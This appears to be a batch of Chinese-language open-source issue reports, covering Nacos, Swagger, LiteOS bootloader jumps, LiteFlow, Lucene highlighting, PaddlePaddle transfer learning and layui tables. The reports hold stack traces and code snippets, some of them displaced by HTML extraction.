c.a.n.c.l.StartingApplicationListener : Nacos failed to start, please see C:\Users\admin\nacos\logs\nacos.log for more details. 2021-09-10 09:02:12.301 INFO 16368 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2021-09-10 09:02:12.364 ERROR 16368 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'grpcClusterServer': Invocation of init method failed; nested exception is java.lang.IncompatibleClassChangeError: Class com.alibaba.nacos.api.grpc.auto.Payload does not implement the requested interface com.google.protobuf.MessageLite at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:602) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.builder.SpringApplicationBuilder.run(SpringApplicationBuilder.java:144) at com.jeesite.modules.NacosApplication.main(NacosApplication.java:32) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:49) at org.springframework.boot.loader.Launcher.launch(Launcher.java:108) at org.springframework.boot.loader.Launcher.launch(Launcher.java:58) at org.springframework.boot.loader.WarLauncher.main(WarLauncher.java:59) Caused by: java.lang.IncompatibleClassChangeError: Class com.alibaba.nacos.api.grpc.auto.Payload does not implement the requested interface com.google.protobuf.MessageLite at io.grpc.protobuf.lite.ProtoLiteUtils$MessageMarshaller.&lt;init&gt;(ProtoLiteUtils.java:128) at io.grpc.protobuf.lite.ProtoLiteUtils.marshaller(ProtoLiteUtils.java:84) at io.grpc.protobuf.ProtoUtils.marshaller(ProtoUtils.java:57) at com.alibaba.nacos.core.remote.grpc.BaseGrpcServer.addServices(BaseGrpcServer.java:172) at com.alibaba.nacos.core.remote.grpc.BaseGrpcServer.startServer(BaseGrpcServer.java:110) at com.alibaba.nacos.core.remote.BaseRpcServer.start(BaseRpcServer.java:47) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 25 common frames omitted"
Get请求数组类型参数，没有增加按钮,"Get请求下，数组类型参数，新版本下参数输入框没有增加按钮，没法输入多个 以下为Controller代码 以下为2.0.2页面截图   <code>: @GetMapping(""/multi"") @ApiOperation(""批量获取字典数据"") @ApiImplicitParams({ @ApiImplicitParam(paramType = ""query"", dataType = ""String"", allowMultiple = true, name = ""codes"", value = ""字典编码"") }) public Res&lt;Map&lt;String, List&lt;Dic&gt;&gt;&gt; multiDict(@RequestParam String[] codes) { return Res.ok(dicService.multiGet(Arrays.asList(codes))); }"
如何运行LiteOS 启动地址偏移后的app,"大家好， 我想用liteos做一个bootloader引导程序，我用stm32f429igt6外部晶振25M， 我用cubeide生成无操作系统工程后，将bootloader烧录到mcu,程序能正常跳转到app,运行正常 我用同样的方法将bootloader核心跳转函数在liteos上的new task运行,程序却无法跳转到app. 我无法查看我此时的运行状诚并尝试用debug和printf功能打印调试，又用stlink查看flash地址，都是正常，我怀疑是中断向是向量问题，但又不知如何从lite studio中去查找错误原因 我是在user_task.c中增加了flash跳转函数， flash跳转地址是0x8010000 源码如下： /*---------------------------------------------------------------------------- Copyright (c) Huawei Technologies Co., Ltd. 2013-2020. All rights reserved. Description: User Task Implementation Author: Huawei LiteOS Team Create: 2013-01-01 Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. <ol start=""3""> Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. --------------------------------------------------------------------------- */ #include ""sys_init.h"" #include ""demo_entry.h"" /* 函 数 名: JumpToBootloader 功能说明: 跳转到系统BootLoader 形 参: 无 返 回 值: 无 */ #if 1 VOID JumpToBootloader(VOID) { uint32_t i=0; VOID (<em>SysMemBootJump)(VOID); /</em> 声明一个函数指针 <em>/ __IO uint32_t BootAddr = 0x8010000; /</em> APP 地址 */ } #endif VOID UserTaskFunc1(VOID) { while (1) { printf(""task1.\r\n""); LOS_TaskDelay(1000); } } VOID UserTaskFunc2(VOID) { while (1) { printf(""task2.\r\n""); LOS_TaskDelay(2000); JumpToBootloader(); } } STATIC UINT32 UserTask1(VOID) { UINT32 taskId = 0; TSK_INIT_PARAM_S taskP; } STATIC UINT32 UserTask2(VOID) { UINT32 taskId = 0; TSK_INIT_PARAM_S taskP; } VOID UserTask(VOID) { UserTask1(); UserTask2(); } VOID app_init(VOID) { printf(""app test&gt;&gt;&gt;&gt;!\r\n""); UserTask(); } /* VOID app_init(VOID) { printf(""app init!\n""); (VOID)DemoEntry(); } */   <code>: __set_PRIMASK(1); /* 禁止全局中断 */ /* 关闭滴答定时器，复位到默认值 */ SysTick-&gt;CTRL = 0; SysTick-&gt;LOAD = 0; SysTick-&gt;VAL = 0; /* 设置所有时钟到默认状态，使用HSI时钟 */ HAL_RCC_DeInit(); /* 关闭所有中断，清除所有中断挂起标志 */ for (i = 0; i &lt; 8; i++) { NVIC-&gt;ICER[i]=0xFFFFFFFF; NVIC-&gt;ICPR[i]=0xFFFFFFFF; } __set_PRIMASK(0); /* 使能全局中断 */ /* 跳转到系统BootLoader，首地址是MSP，地址+4是复位中断服务程序地址 */ SysMemBootJump = (VOID (*)(VOID)) (*((uint32_t *) (BootAddr + 4))); /* 设置主堆栈指针 */ __set_MSP(*(uint32_t *)BootAddr); /* 在RTOS工程，这条语句很重要，设置为特权级模式，使用MSP指针 */ __set_CONTROL(0); /* 跳转到系统BootLoader */ SysMemBootJump(); /* 跳转成功的话，不会执行到这里，用户可以在这里添加代码 */ while (1) { } memset(&amp;taskP, 0, sizeof(TSK_INIT_PARAM_S)); taskP.pfnTaskEntry = (TSK_ENTRY_FUNC)UserTaskFunc1; taskP.uwStackSize = LOSCFG_BASE_CORE_TSK_DEFAULT_STACK_SIZE; taskP.pcName = ""Task1""; taskP.usTaskPrio = LOSCFG_BASE_CORE_TSK_DEFAULT_PRIO; return LOS_TaskCreate(&amp;taskId, &amp;taskP); memset(&amp;taskP, 0, sizeof(TSK_INIT_PARAM_S)); taskP.pfnTaskEntry = (TSK_ENTRY_FUNC)UserTaskFunc2; taskP.uwStackSize = LOSCFG_BASE_CORE_TSK_DEFAULT_STACK_SIZE; taskP.pcName = ""Task2""; taskP.usTaskPrio = LOSCFG_BASE_CORE_TSK_DEFAULT_PRIO; return LOS_TaskCreate(&amp;taskId, &amp;taskP); (VOID)DemoEntry();"
启动报空指针,"使用springboot方式   <code>: liteflow: rule-source: flow.xml thread-executor-class: com.zhj.demo.liteflow.CustomThreadBuilder enable: true &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;flow&gt; &lt;chain name=""chain1""&gt; &lt;when value=""c,d,e""/&gt; &lt;then value=""a,b""/&gt; &lt;/chain&gt; &lt;/flow&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.4.5&lt;/version&gt; &lt;/dependency&gt; @Component public class Test { @Resource private FlowExecutor flowExecutor; @PostConstruct public void init(){ LiteflowResponse&lt;DefaultSlot&gt; response = flowExecutor.execute2Resp(""chain1"", ""arg""); } } ""C:\Program Files\Java\jdk1.8.0_202\bin\java.exe"" -agentlib:jdwp=transport=dt_socket,address=127.0.0.1:54733,suspend=y,server=n -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -javaagent:C:\Users\zhj\AppData\Local\JetBrains\IntelliJIdea2021.3\captureAgent\debugger-agent.jar -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true -Dfile.encoding=UTF-8 -classpath ""C:\Program Files\Java\jdk1.8.0_202\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_202\jre\lib\rt.jar;E:\gst\IdeaProjects\Demo\liteflow\target\classes;D:\maven_repo\com\yomahub\liteflow-spring-boot-starter\2.6.7\liteflow-spring-boot-starter-2.6.7.jar;D:\maven_repo\com\yomahub\liteflow-core\2.6.7\liteflow-core-2.6.7.jar;D:\maven_repo\com\yomahub\liteflow-script-common\2.6.7\liteflow-script-common-2.6.7.jar;D:\maven_repo\cn\hutool\hutool-core\5.7.16\hutool-core-5.7.16.jar;D:\maven_repo\org\slf4j\slf4j-api\1.7.21\slf4j-api-1.7.21.jar;D:\maven_repo\com\alibaba\fastjson\1.2.70\fastjson-1.2.70.jar;D:\maven_repo\dom4j\dom4j\1.6.1\dom4j-1.6.1.jar;D:\maven_repo\xml-apis\xml-apis\1.0.b2\xml-apis-1.0.b2.jar;D:\maven_repo\org\apache\curator\curator-framework\2.12.0\curator-framework-2.12.0.jar;D:\maven_repo\org\apache\curator\curator-client\2.12.0\curator-client-2.12.0.jar;D:\maven_repo\org\apache\zookeeper\zookeeper\3.4.8\zookeeper-3.4.8.jar;D:\maven_repo\jline\jline\0.9.94\jline-0.9.94.jar;D:\maven_repo\io\netty\netty\3.7.0.Final\netty-3.7.0.Final.jar;D:\maven_repo\com\google\guava\guava\16.0.1\guava-16.0.1.jar;D:\maven_repo\org\apache\curator\curator-recipes\2.12.0\curator-recipes-2.12.0.jar;D:\maven_repo\com\alibaba\transmittable-thread-local\2.12.1\transmittable-thread-local-2.12.1.jar;D:\maven_repo\org\springframework\boot\spring-boot-autoconfigure\2.0.5.RELEASE\spring-boot-autoconfigure-2.0.5.RELEASE.jar;D:\maven_repo\cn\hutool\hutool-all\5.7.15\hutool-all-5.7.15.jar;D:\maven_repo\org\springframework\boot\spring-boot-starter\2.4.5\spring-boot-starter-2.4.5.jar;D:\maven_repo\org\springframework\boot\spring-boot\2.4.5\spring-boot-2.4.5.jar;D:\maven_repo\org\springframework\spring-context\5.3.6\spring-context-5.3.6.jar;D:\maven_repo\org\springframework\spring-aop\5.3.6\spring-aop-5.3.6.jar;D:\maven_repo\org\springframework\spring-beans\5.3.6\spring-beans-5.3.6.jar;D:\maven_repo\org\springframework\spring-expression\5.3.6\spring-expression-5.3.6.jar;D:\maven_repo\org\springframework\boot\spring-boot-starter-logging\2.4.5\spring-boot-starter-logging-2.4.5.jar;D:\maven_repo\ch\qos\logback\logback-classic\1.2.3\logback-classic-1.2.3.jar;D:\maven_repo\ch\qos\logback\logback-core\1.2.3\logback-core-1.2.3.jar;D:\maven_repo\org\apache\logging\log4j\log4j-to-slf4j\2.13.3\log4j-to-slf4j-2.13.3.jar;D:\maven_repo\org\apache\logging\log4j\log4j-api\2.13.3\log4j-api-2.13.3.jar;D:\maven_repo\org\slf4j\jul-to-slf4j\1.7.30\jul-to-slf4j-1.7.30.jar;D:\maven_repo\jakarta\annotation\jakarta.annotation-api\1.3.5\jakarta.annotation-api-1.3.5.jar;D:\maven_repo\org\springframework\spring-core\5.3.6\spring-core-5.3.6.jar;D:\maven_repo\org\springframework\spring-jcl\5.3.6\spring-jcl-5.3.6.jar;D:\maven_repo\org\yaml\snakeyaml\1.27\snakeyaml-1.27.jar;C:\Program Files\JetBrains\IntelliJ IDEA 2021.3\lib\idea_rt.jar"" com.zhj.demo.liteflow.Main Connected to the target VM, address: '127.0.0.1:54733', transport: 'socket' . ____ _ __ _ _ /\\ / ___'_ __ _ _(_)_ __ __ _ \ \ \ \ ( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \ \\/ ___)| |_)| | | | | || (_| | ) ) ) ) ' |____| .__|_| |_|_| |_\__, | / / / / =========|_|==============|___/=/_/_/_/ :: Spring Boot :: (v2.4.5) 2021-12-30 14:17:11.020 INFO 30428 --- [ main] com.zhj.demo.liteflow.Main : Starting Main using Java 1.8.0_202 on ZHJ with PID 30428 (E:\gst\IdeaProjects\Demo\liteflow\target\classes started by zhj in E:\gst\IdeaProjects\Demo) 2021-12-30 14:17:11.021 INFO 30428 --- [ main] com.zhj.demo.liteflow.Main : No active profile set, falling back to default profiles: default 2021-12-30 14:17:11.243 INFO 30428 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'com.yomahub.liteflow.springboot.config.LiteflowMainAutoConfiguration' of type [com.yomahub.liteflow.springboot.config.LiteflowMainAutoConfiguration$$EnhancerBySpringCGLIB$$72018806] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-12-30 14:17:11.246 INFO 30428 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'com.yomahub.liteflow.springboot.config.LiteflowPropertyAutoConfiguration' of type [com.yomahub.liteflow.springboot.config.LiteflowPropertyAutoConfiguration$$EnhancerBySpringCGLIB$$d222696a] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-12-30 14:17:11.260 INFO 30428 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'liteflow-com.yomahub.liteflow.springboot.LiteflowProperty' of type [com.yomahub.liteflow.springboot.LiteflowProperty] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-12-30 14:17:11.261 INFO 30428 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'liteflow.monitor-com.yomahub.liteflow.springboot.LiteflowMonitorProperty' of type [com.yomahub.liteflow.springboot.LiteflowMonitorProperty] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-12-30 14:17:11.266 INFO 30428 --- [ main] trationDelegate$BeanPostProcessorChecker : Bean 'liteflowConfig' of type [com.yomahub.liteflow.property.LiteflowConfig] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2021-12-30 14:17:11.269 INFO 30428 --- [ main] com.yomahub.liteflow.util.LOGOPrinter : ================================================================================================ _ ___ _____ _____ _____ _ _____ __ | | |_ _|_ _| ____| | ___| | / _ \ \ / / | | | | | | | _| _____| |_ | | | | | \ \ /\ / / | |___ | | | | | |__|_____| _| | |__| |_| |\ V V / |_____|___| |_| |_____| |_| |_____\___/ \_/\_/ 做最轻量级，最实用的微流程框架 To be the most lightweight and the most practical micro-process framework ================================================================================================ 2021-12-30 14:17:11.283 INFO 30428 --- [ main] c.y.liteflow.spring.ComponentScanner : component[a] has been found 2021-12-30 14:17:11.284 INFO 30428 --- [ main] c.y.liteflow.spring.ComponentScanner : component[b] has been found 2021-12-30 14:17:11.284 INFO 30428 --- [ main] c.y.liteflow.spring.ComponentScanner : component[c] has been found 2021-12-30 14:17:11.284 INFO 30428 --- [ main] c.y.liteflow.spring.ComponentScanner : component[d] has been found 2021-12-30 14:17:11.285 INFO 30428 --- [ main] c.y.liteflow.spring.ComponentScanner : component[e] has been found 2021-12-30 14:17:11.291 INFO 30428 --- [ main] com.yomahub.liteflow.core.FlowExecutor : flow info loaded from local file,path=flow.xml,format type=xml 2021-12-30 14:17:11.355 INFO 30428 --- [ main] com.yomahub.liteflow.core.FlowExecutor : slot[0] offered 2021-12-30 14:17:11.356 INFO 30428 --- [ main] com.yomahub.liteflow.core.FlowExecutor : requestId[IVe0EpZfPTFEaD7O37YzS] has generated 2021-12-30 14:17:12.567 ERROR 30428 --- [ main] c.y.liteflow.thread.ExecutorHelper : null java.lang.NullPointerException: null at com.yomahub.liteflow.thread.ExecutorHelper.buildExecutor(ExecutorHelper.java:80) ~[liteflow-core-2.6.7.jar:na] at com.yomahub.liteflow.entity.flow.Chain.executeAsyncCondition(Chain.java:118) [liteflow-core-2.6.7.jar:na] at com.yomahub.liteflow.entity.flow.Chain.execute(Chain.java:92) [liteflow-core-2.6.7.jar:na] at com.yomahub.liteflow.core.FlowExecutor.doExecute(FlowExecutor.java:368) [liteflow-core-2.6.7.jar:na] at com.yomahub.liteflow.core.FlowExecutor.execute2Resp(FlowExecutor.java:309) [liteflow-core-2.6.7.jar:na] at com.yomahub.liteflow.core.FlowExecutor.execute2Resp(FlowExecutor.java:300) [liteflow-core-2.6.7.jar:na] at com.yomahub.liteflow.core.FlowExecutor.execute2Resp(FlowExecutor.java:296) [liteflow-core-2.6.7.jar:na] at com.zhj.demo.liteflow.Test.init(Test.java:19) [classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_202] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_202] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_202] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_202] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:422) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:602) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) [spring-beans-5.3.6.jar:5.3.6] at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) ~[spring-beans-5.3.6.jar:5.3.6] at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) ~[spring-context-5.3.6.jar:5.3.6] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) ~[spring-context-5.3.6.jar:5.3.6] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:782) ~[spring-boot-2.4.5.jar:2.4.5] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:774) ~[spring-boot-2.4.5.jar:2.4.5] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:439) ~[spring-boot-2.4.5.jar:2.4.5] at org.springframework.boot.SpringApplication.run(SpringApplication.java:339) ~[spring-boot-2.4.5.jar:2.4.5] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1340) ~[spring-boot-2.4.5.jar:2.4.5] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1329) ~[spring-boot-2.4.5.jar:2.4.5] at com.zhj.demo.liteflow.Main.main(Main.java:17) ~[classes/:na] 2021-12-30 14:17:12.568 ERROR 30428 --- [ main] com.yomahub.liteflow.core.FlowExecutor : [IVe0EpZfPTFEaD7O37YzS]:chain[chain1] execute error on slot[0] 2021-12-30 14:17:12.568 INFO 30428 --- [ main] com.yomahub.liteflow.entity.data.Slot : [IVe0EpZfPTFEaD7O37YzS]:CHAIN_NAME[chain1] 2021-12-30 14:17:12.568 INFO 30428 --- [ main] c.yomahub.liteflow.entity.data.DataBus : [IVe0EpZfPTFEaD7O37YzS]:slot[0] released 2021-12-30 14:17:18.390 INFO 30428 --- [ main] com.yomahub.liteflow.core.FlowExecutor : flow info loaded from local file,path=flow.xml,format type=xml 2021-12-30 14:17:18.424 INFO 30428 --- [ main] com.zhj.demo.liteflow.Main : Started Main in 7.63 seconds (JVM running for 8.08) Disconnected from the target VM, address: '127.0.0.1:54733', transport: 'socket' Process finished with exit code 0"
最新版本的，还是会报错 highlight.InvalidTokenOffsetsException: Token,"我用最新版本的，还是会报错啊。 org.apache.lucene.search.highlight.InvalidTokenOffsetsException: Token 七夕情人节 exceeds length of provided text sized jcseg.properties 文件设置了 jcseg.cnnumtoarabic = 0   <code>: public class LuenceDemo { public static void main(String[] args) throws IOException, ParseException, InvalidTokenOffsetsException { Analyzer analyzer = new JcsegAnalyzer5X(JcsegTaskConfig.COMPLEX_MODE); // Store theindex in memory: // 索引存到内存中的目录 Directory directory = new RAMDirectory(); // To store anindex on disk, use this instead: // Directorydirectory = FSDirectory.open(""/tmp/testindex""); // 配置索引 IndexWriterConfig config = new IndexWriterConfig(analyzer); IndexWriter iwriter = new IndexWriter(directory, config); // 这里，将5篇文档filedname信息和content信息存入索引 Document doc[] = new Document[6]; for (int i = 0; i &lt; 6; i++) { doc[i] = new Document(); } String[] text = { ""中华人民共和国中央人民政府"", ""中国是个伟大的国家"", ""我出生在美丽的中国，我爱中国，中国"", ""中华美丽的中国爱你"", ""七夕"", ""七夕情人节"" }; doc[0].add(new Field(""fieldname"", text[0], TextField.TYPE_STORED)); //doc[0].add(new Field(""content"", text[5], TextField.TYPE_STORED)); doc[1].add(new Field(""fieldname"", text[1], TextField.TYPE_STORED)); doc[2].add(new Field(""fieldname"", text[2], TextField.TYPE_STORED)); doc[3].add(new Field(""fieldname"", text[3], TextField.TYPE_STORED)); doc[4].add(new Field(""fieldname"", text[4], TextField.TYPE_STORED)); doc[5].add(new Field(""fieldname"", text[5], TextField.TYPE_STORED)); iwriter.addDocument(doc[0]); iwriter.addDocument(doc[1]); iwriter.addDocument(doc[2]); iwriter.addDocument(doc[3]); iwriter.addDocument(doc[4]); iwriter.addDocument(doc[5]); iwriter.close(); // Now searchthe index: // 索引构建完毕，准备搜索。 // 设定搜索目录 DirectoryReader ireader = DirectoryReader.open(directory); IndexSearcher isearcher = new IndexSearcher(ireader); // Parse asimple query that searches for ""text"": // QueryParserparser = new QueryParser(Version.LUCENE_CURRENT, // ""fieldname"",analyzer); // 使用同样的方式对多field进行搜索 String[] multiFields = { ""fieldname"", ""content"" }; MultiFieldQueryParser parser = new MultiFieldQueryParser(multiFields, analyzer); // 设定具体的搜索词 Query query = parser.parse(""七夕""); TopDocs docs =isearcher.search(query,null, 10);//查找 ScoreDoc[] hits = docs.scoreDocs; SimpleHTMLFormatter simpleHTMLFormatter = new SimpleHTMLFormatter(""&lt;span style='color:green'&gt;"", ""&lt;/span&gt;""); Highlighter highlighter = new Highlighter(simpleHTMLFormatter, new QueryScorer(query)); //高亮htmlFormatter对象 //设置高亮附近的字数 highlighter.setTextFragmenter(new SimpleFragmenter(100)); // assertEquals(1, hits.length); System.out.println(""Searched "" + hits.length + "" documents.""); // Iteratethrough the results: for (int i = 0; i &lt; hits.length; i++) { Document hitDoc = isearcher.doc(hits[i].doc); String value =hitDoc.get(""fieldname""); ; TokenStream tokenStream = analyzer.tokenStream(value, new StringReader(value)); // String str1 = highlighter.getBestFragment(tokenStream, value); // System.out.println(str1); try { System.out.println( highlighter.getBestFragment(analyzer, ""fieldname"", hitDoc.get(""fieldname""))); } catch (Exception e) { e.printStackTrace(); } } ireader.close(); directory.close(); } }"
在模型迁移时出现浮点异常,"在图像分类中，我使用VGG16训练了一个CIFAR-10的数据集的模型，然后我想把这个模型迁移到102个花卉的数据集上，我把模型参数文件的三个全连接层的文件删除了，然后重新打包，作为模型的初始化参数。然后进行训练，一开始是正常训练的，中途集报浮点异常了，怎么解决呢？   <code>: Thread [139776498267904] Forwarding __conv_1__, *** Aborted at 1528362552 (unix time) try ""date -d @1528362552"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGFPE (@0x7f2021f91318) received by PID 38152 (TID 0x7f204086f700) from PID 569971480; stack trace: *** @ 0x7f204dcc2390 (unknown) @ 0x7f2021f91318 mkl_blas_avx2_sgemm_kernel_nocopy_NN_b0 Floating point exception (core dumped)"
希望表格列高度按照内容高度自适应的同时，左右浮动列区域也能保持一致高度,版本：2.6.13 描述：我利用样式让数据表格超出的文字不显示...，但是右边操作按钮区高度错乱，与数据表格高度不一致 在示例table-test.html基础上，增加如下样式： 这是增加上面样式之后的效果，希望表格列高度按照内容高度自适应的同时，左右浮动列区域也能保持一致高度   <code>: .layui-table-cell { height: auto ; white-space: normal; }
